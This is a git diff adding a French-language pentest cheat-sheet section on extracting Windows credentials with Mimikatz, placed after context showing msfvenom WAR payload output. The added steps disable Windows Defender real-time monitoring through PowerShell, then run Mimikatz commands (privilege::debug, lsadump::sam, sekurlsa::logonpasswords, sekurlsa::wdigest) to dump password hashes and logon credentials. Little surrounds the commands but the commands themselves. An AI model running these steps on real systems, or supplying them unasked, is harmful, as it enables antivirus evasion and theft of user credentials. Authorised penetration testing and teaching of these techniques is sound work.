@@ -339,3 +339,35 @@ Payload size: 6259 bytes
 Final size of war file: 6259 bytes
 ```
 
+# Extraire des credentials avec Mimikatz
+
+Télécharger PSexec
+
+(https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)[https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite]
+
+Ouvrir un powershell (en tant qu'administrateur).
+
+Désactiver temprorairement l'antivirus en powershell:
+`Set-MpPreference -DisableRealtimeMonitoring $true`
+
+Télécharger Mimikatz :
+[https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)
+
+Choisir le format zip, et faire un clic droit "Extraire tout".
+
+### Exécuter Mimikatz:
+Dans x64
+```powershell
+.\mimikatz.exe
+
+mimikatz # privilege::debug
+mimikatz # lsadump::sam
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::wdigest
+
+```
+
+
+Références de commandes, et des infos récupérables par version de Windows :
+
+[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
